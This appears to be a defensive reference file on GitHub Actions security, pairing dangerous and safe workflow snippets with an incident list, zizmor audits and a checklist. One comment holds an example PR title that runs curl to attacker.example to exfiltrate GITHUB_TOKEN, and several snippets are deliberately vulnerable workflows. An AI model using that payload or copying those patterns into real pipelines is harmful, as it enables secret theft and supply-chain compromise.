# GitHub Actions Security Patterns

Platform facts and their dates live in `standards.md`. AI agents running inside workflows
(`claude-code-action`, `codex-action`, `run-gemini-cli`, `actions/ai-inference`) are covered by
`agentic-security.md` AG-10. Malicious workflow techniques (unexpected workflows, run deletion,
lookalike checkouts) are in `threat-intelligence.md`.

## Critical Vulnerabilities

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| `${{ github.event.pull_request.title }}` (or any untrusted context) in `run:` | Script injection, arbitrary code execution | CRITICAL | Pass through `env:` and quote the variable |
| `pull_request_target` + checkout of the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `head.ref`) | Untrusted code runs with secrets and a write token | CRITICAL | Never build or run PR code in `pull_request_target`; use `pull_request` |
| `workflow_run` that downloads and uses artifacts from a fork-triggered run | Artifact poisoning into a privileged context | HIGH-CRITICAL | Treat artifacts as untrusted data; never execute or `source` them |
| Unpinned action: `uses: org/action@v1` or `@main` | Tag or branch can be repointed (supply chain) | HIGH | Pin to a full 40-character commit SHA |
| No `permissions:` key, or `write-all` | Over-permissioned `GITHUB_TOKEN` | HIGH | `permissions: {}` at top level, minimal per job |
| `id-token: write` at workflow level or on jobs that run untrusted code | Attacker can mint OIDC tokens for your cloud or registry | HIGH | Grant only to the publish or deploy job; restrict the cloud trust policy's `sub` claim |
| `actions/checkout` without `persist-credentials: false` | Token stays available to every later step and to uploaded workspaces | MEDIUM (HIGH with untrusted code or artifact upload of the workspace) | `persist-credentials: false` unless a later step pushes |
| Release jobs restoring caches writable by less-trusted workflows | Cache poisoning of release artifacts | HIGH | No caches in release or publish jobs, or isolate cache keys |
| Release job checks out another `repository:` | Build from a lookalike repo | CRITICAL | Build only from `${{ github.repository }}` |
| Secrets echoed or interpolated into `run:` | Credential exposure in logs and process lists | HIGH | Pass secrets through `env:`; never print them |
| Self-hosted runners for public repos, non-ephemeral | Persistent runner compromise | HIGH | Ephemeral or container runners; never for fork PRs |
| `ACTIONS_STEP_DEBUG` in production workflows | Verbose output may leak values | MEDIUM | Remove debug flags |

## Script Injection (the most common GitHub Actions vulnerability)

### DANGEROUS: Direct interpolation in run blocks

```yaml
# CRITICAL: Attacker controls PR title → arbitrary command execution
- run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    # If title is: "; curl attacker.example/steal?t=$GITHUB_TOKEN #
    # The expression is pasted into the script before the shell runs.
```

### Injectable contexts (treat as untrusted)

```text
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref
github.event.pull_request.head.label
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.discussion.title
github.event.discussion.body
github.event.pages.*.page_name
github.event.commits.*.message
github.event.commits.*.author.name
github.event.commits.*.author.email
github.event.head_commit.message
github.event.head_commit.author.name
github.event.workflow_run.head_branch
github.event.workflow_run.head_commit.message
github.head_ref            # branch name, attacker-controlled in forks
inputs.*                   # on workflow_dispatch from users who can trigger it
```

### SAFE: Use environment variables

```yaml
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Processing PR: $PR_TITLE"   # quoted shell variable, not template expansion
```

Real case: Nx s1ngularity (2025-08-26). A `pull_request_target` workflow echoed an unsanitized PR
title; with default read/write token permissions and a `workflow_dispatch` publish workflow, the
attacker exposed `NPM_TOKEN` and published malicious versions (https://nx.dev/blog/s1ngularity-postmortem).

## pull_request_target

Since **2025-12-08**, `pull_request_target` always runs the workflow file from the **default
branch** (https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/).
That stops attackers from triggering stale, vulnerable copies of a workflow on other branches. It
does **not** stop a workflow on the default branch from explicitly checking out and running PR
head code. That pattern stays **CRITICAL**.

### DANGEROUS: Checking out PR code with secrets

```yaml
# CRITICAL: fork PR code executes with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # PR code!
      - run: npm install   # attacker's package.json preinstall runs here
```

Real case: PostHog in Shai-Hulud 2.0. A workflow switched to `pull_request_target` checked out the
PR head; a malicious PR leaked a bot token, which led to the npm token and the worm's start on
2025-11-24 (https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem).

### SAFE: Base-branch code only, or split privileged and unprivileged work

```yaml
on: pull_request_target
permissions: { pull-requests: write }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>   # default ref = base branch
        with:
          persist-credentials: false
      - run: ./scripts/label-pr.sh "$PR_NUMBER"
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
```

## workflow_run Artifact Poisoning

A `workflow_run` workflow runs in the base repository's privileged context (secrets, write token)
after another workflow finishes. If the triggering run came from a fork PR, its artifacts are
attacker-controlled.

```yaml
# DANGEROUS: privileged workflow trusts artifacts from a fork-triggered run
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with: { run-id: "${{ github.event.workflow_run.id }}", github-token: "${{ secrets.GITHUB_TOKEN }}" }
      - run: |
          unzip pr.zip          # can overwrite files in the workspace
          bash ./report.sh      # executes attacker content
          gh pr comment $(cat pr_number) --body-file out.md   # injection via file content
```

```yaml
# SAFE: extract to a temp dir, validate, never execute
      - run: |
          mkdir -p "$RUNNER_TEMP/art" && unzip -o pr.zip -d "$RUNNER_TEMP/art"
          PR=$(cat "$RUNNER_TEMP/art/pr_number")
          [[ "$PR" =~ ^[0-9]+$ ]] || exit 1
          gh pr comment "$PR" --body-file "$RUNNER_TEMP/art/out.md"
```

Report when: `workflow_run` + `download-artifact` (or `gh run download`) + any of: executing, sourcing or `npm install`-ing from the artifact; extracting into the workspace; using artifact content unvalidated in commands. Also flag `github.event.workflow_run.head_branch` in `run:`.

## Credentials: persist-credentials, id-token, secrets

### persist-credentials

`actions/checkout` is at **v7** and still defaults `persist-credentials` to `true`
(https://github.com/actions/checkout). v6 only moved the token from `.git/config` into a file
under `$RUNNER_TEMP`; it is still available to every later step in the job.

```yaml
# DANGEROUS: token persists for later steps, including third-party actions and build scripts
- uses: actions/checkout@<sha>
- run: npm ci && npm run build
# SAFE
- uses: actions/checkout@<sha>
  with:
    persist-credentials: false
```

Report MEDIUM by default; HIGH when later steps run untrusted code (dependency install, PR code) or upload the workspace as an artifact (zizmor `artipacked`).

### id-token: write

```yaml
# DANGEROUS: every job, including test jobs that run dependency code, can mint OIDC tokens
permissions:
  id-token: write
  contents: read
# SAFE: only the publish job, behind an environment
jobs:
  publish:
    environment: release
    permissions: { id-token: write, contents: read }
```

Also check the cloud side when IaC is in the repo: a trust policy must pin `sub` to this repository
and a protected branch or environment, never `repo:org/*`.

### Secrets

```yaml
# DANGEROUS: secret in the script text (also visible in process listings)
- run: echo "Token: ${{ secrets.API_TOKEN }}"
- run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.com

# DANGEROUS: secret passed to an untrusted, unpinned action
- uses: random-org/untrusted-action@v1
  with:
    token: ${{ secrets.GITHUB_TOKEN }}

# SAFE: pass through env, never echo. Registered secrets are already masked in logs.
- run: curl -H "Authorization: Bearer $TOKEN" https://api.example.com
  env:
    TOKEN: ${{ secrets.API_TOKEN }}

# SAFE: mask a DERIVED value (not a registered secret) before it can appear in logs
- run: |
    SESSION=$(./get-session.sh)
    echo "::add-mask::$SESSION"
    echo "SESSION=$SESSION" >> "$GITHUB_ENV"
```

Never write `echo "::add-mask::${{ secrets.X }}"`: the expression is expanded into the script
before masking applies, so the value appears in the rendered script and process list.

## Cache Poisoning

```yaml
# DANGEROUS: release job restores a cache that PR workflows can also write
on: { push: { tags: ["v*"] } }
jobs:
  release:
    steps:
      - uses: actions/setup-node@<sha>
        with: { cache: npm }       # cache populated by lower-trust runs
      - run: npm ci && npm publish
```

Report when release, publish or deploy jobs restore caches (`actions/cache`, `setup-*` `cache:`)
that share keys with workflows triggered by PRs or `pull_request_target`. Real case: Ultralytics
build workflow and cache compromise before malicious PyPI releases
(https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/). zizmor audit: `cache-poisoning`.

## Action Pinning, Policy and Releases

### DANGEROUS: Tag-based (can be repointed)

```yaml
uses: actions/checkout@v7        # tag can move to a malicious commit
uses: some-org/action@main       # branch HEAD changes constantly
```

Real case: tj-actions/changed-files, 2025-03-14 to 15. Existing version tags were repointed to a
commit that printed CI secrets to logs (https://github.com/advisories/GHSA-mrrh-fwg8-r2c3).

### SAFE: SHA-pinned, with the version in a comment

```yaml
uses: actions/checkout@<full-40-char-commit-sha>  # v7.x.y
```

- Organizations can enforce SHA pinning and block specific actions by policy since 2025-08-15
  (https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/).
  When the repo is an org repo with no such policy evidence, add an INFO recommendation.
- Short SHAs and SHAs from a fork network can be impostor commits; zizmor's `impostor-commit` audit needs online mode.
- For the repo's own releases: enable **immutable releases** (GA 2025-10-28) so tags and assets
  cannot be changed after publishing, and verify with `gh release verify` / `gh release verify-asset`
  (https://docs.github.com/en/code-security/concepts/supply-chain-security/immutable-releases).
  Report MEDIUM when a project's install docs download release assets and releases are mutable or unverified.

## Permissions

```yaml
# DANGEROUS: no permissions key → repository default (often read/write)
jobs:
  build:
    runs-on: ubuntu-latest

# SAFE
permissions: {}            # top level: nothing by default
jobs:
  build:
    permissions:
      contents: read
      pull-requests: write  # only if posting comments
    runs-on: ubuntu-latest
```

## Other Supply-Chain Incidents (technique examples)

| Incident | Date | Technique | Source |
|---|---|---|---|
| Shai-Hulud wave 1 | from about 2025-09-15 | npm worm spreading with stolen npm tokens; pushed malicious workflows and dumped secrets to public repos | https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack |
| Shai-Hulud 2.0 | 2025-11-21 to 24 | `preinstall` payload; PostHog seed via `pull_request_target` head checkout | https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack |
| GhostAction | 2026-10 | Injected `security-audit.yml`-style workflows exfiltrating secrets to a raw IP | D§12: https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/ |
| LiteLLM 1.107.0 | 2026-10-21 | Stolen maintainer tokens changed the release workflow, built from a lookalike repo, deleted run records | D§11: https://docs.litellm.ai/blog/security-incident-oct-21-2026 |

## Detection Tool: zizmor

Static analysis for GitHub Actions. Repository: https://github.com/zizmorcore/zizmor (the old
`woodruffw/zizmor` URL redirects). Audit list: https://docs.zizmor.sh/audits/ . PYA runs it with
`--offline --format json` when installed.

| zizmor audit | Covers |
|---|---|
| `template-injection` | Untrusted expressions in `run:` and scripts |
| `dangerous-triggers` | `pull_request_target`, `workflow_run` |
| `excessive-permissions` | Missing or broad `permissions:` |
| `unpinned-uses` | Tag or branch pins |
| `artipacked` | Persisted checkout credentials, workspace uploads |
| `cache-poisoning` | Caches in release workflows |
| `typosquat-uses` | Lookalike action names |
| `impostor-commit` | SHAs not on the claimed repo (online mode only) |

zizmor has **no audit for AI-agent actions**; agentic-auditor covers those (vectors A to I).
A tool that did not run is reported as "not run", never as "clean".

## Detection Checklist

- [ ] No untrusted context interpolated in `run:` blocks or `script:` inputs
- [ ] No `pull_request_target` workflow that checks out or runs PR head code
- [ ] `workflow_run` workflows treat downloaded artifacts as untrusted data
- [ ] All actions pinned to full commit SHAs
- [ ] `permissions: {}` at top level, minimal per job
- [ ] `id-token: write` only on publish or deploy jobs
- [ ] `persist-credentials: false` on checkouts that do not push
- [ ] No caches restored in release or publish jobs
- [ ] Release jobs build only from `${{ github.repository }}`
- [ ] No unexpected workflow files reading secrets; no run-deletion steps
- [ ] Secrets passed via `env:`, never echoed or interpolated
- [ ] Self-hosted runners are ephemeral and not used for fork PRs
- [ ] Workflow files protected by CODEOWNERS
- [ ] AI agent steps reviewed with `agentic-security.md` AG-10
